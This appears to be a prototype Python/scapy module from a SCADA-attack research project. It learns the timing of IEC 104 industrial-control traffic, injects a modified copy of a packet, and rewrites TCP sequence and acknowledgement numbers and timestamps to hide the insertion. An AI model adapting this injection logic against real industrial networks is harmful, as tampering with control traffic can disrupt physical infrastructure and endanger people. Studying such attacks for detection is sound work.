import random
from scapy.all import *
from scapy.contrib.modbus import *
from scapy.layers.inet import IP
import scapy.utils

import content.python_projects.scada_attacks.regression_model as regression_model


class Iec104PacketInjection:
    def __init__(self):
        self.current_phase = 'learning'  # learning, injecting, patching

        self.tcp_seq_offset = 0

        self.minimum_time = 0
        self.time_observations = 0

        self.tcp_seq_target = 0
        self.global_tcp_seq = 0

        self.packets = []

        self.inject_timer = 0

        self.packet_learning_count = 0

    def main(self, curr_packet):
        if curr_packet[IP].src == '10.10.0.100':  # SCUFFED, will change
            if self.current_phase == 'learning':
                if self.packet_learning_count < 10:  # arbitrary number currently
                    self.packet_learning_count += 1

                    if self.packet_learning_count == 1: self.minimum_time = curr_packet.time; self.time_observations = 0; self.global_tcp_seq = 0

                    #print(curr_packet.show())
                    self.tcp_seq_target += curr_packet[IP].len
                    self.time_observations += curr_packet.time

                else:
                    self.current_phase = 'injecting'; self.inject_timer = regression_model.non_linear_regression(self.time_observations)
            else:
                if self.current_phase == 'injecting':
                    if self.inject_timer > 0:
                        injected_packet = curr_packet.copy()

                        payload = bytearray(injected_packet[Raw].load)
                        payload[len(payload)-1] = 0xFF  # just changing the last byte to test injected packet
                        injected_packet[Raw].load = bytes(payload)

                        injected_packet[TCP].seq += self.tcp_seq_offset
                        injected_packet[TCP].ack += self.tcp_seq_offset

                        injected_packet.time = injected_packet.time - ((self.time_observations / 10 - self.minimum_time) / 1.5)

                        self.packets.append(injected_packet)

                        self.tcp_seq_offset += int(self.tcp_seq_target / 10)

                        self.current_phase = 'learning'
                        self.tcp_seq_target = 0; self.packet_learning_count = 0
                    else: self.inject_timer -= 1

        # 'patching' section, will maybe add a dedicated section for it, but for now what works, works
        if curr_packet[IP].src == '10.10.0.100':
            self.global_tcp_seq += curr_packet[TCP].seq

        curr_packet[TCP].seq += self.tcp_seq_offset
        curr_packet[TCP].ack += self.tcp_seq_offset

        self.packets.append(curr_packet)
